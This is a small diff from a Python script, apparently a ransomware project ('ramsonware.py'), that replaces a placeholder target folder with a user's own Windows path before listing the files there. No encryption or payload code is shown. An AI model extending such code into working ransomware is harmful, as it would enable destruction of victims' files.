@@ -30,7 +30,7 @@ def main():
     IGN_ARQUIVO = [os.path.basename(__file__), 'ramsonware.py']  # Arquivos a serem ignorados
 
     # Caminho completo para a pasta 'arquivos'
-    dir = 'C:/Users/nome/do seu/diretorio/ranswr/arquivos'
+    dir = 'C:/Users/Júlio César/Documents/Projects/Ferramentas/ranswr/arquivos'
 
     # Listar os arquivos no diretório
     arqs = list_files(dir)
